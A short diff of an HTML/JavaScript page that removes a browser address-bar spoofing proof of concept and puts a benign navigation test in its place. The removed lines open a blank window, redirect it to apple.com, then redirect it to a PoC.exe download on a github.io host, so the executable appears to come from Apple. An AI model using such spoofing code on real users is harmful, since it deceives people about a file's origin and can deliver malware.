@@ -1,24 +1,21 @@
-<button style="font-size: 50px;" onclick="spoof()">Click</button>
+<button onclick="test()">Start test</button>
 
 <script>
-function spoof() {
+function test() {
     const w = window.open("about:blank");
 
     w.document.write(`
-        <h1>You're Address Bar Spoofed</h1>
+        <h1>Navigation Test</h1>
 
         <script>
             setTimeout(() => {
-                location.href = 'https://apple.com';
-            }, 1);
+                location.href = "https://example.com";
+            }, 100);
 
-            
             setTimeout(() => {
-                location.href = 'https://heloworld285.github.io/PoC.exe';
-            }, 1000);
-            
+                location.href = "https://example.org";
+            }, 500);
         <\/script>
-
     `);
 }
 </script>
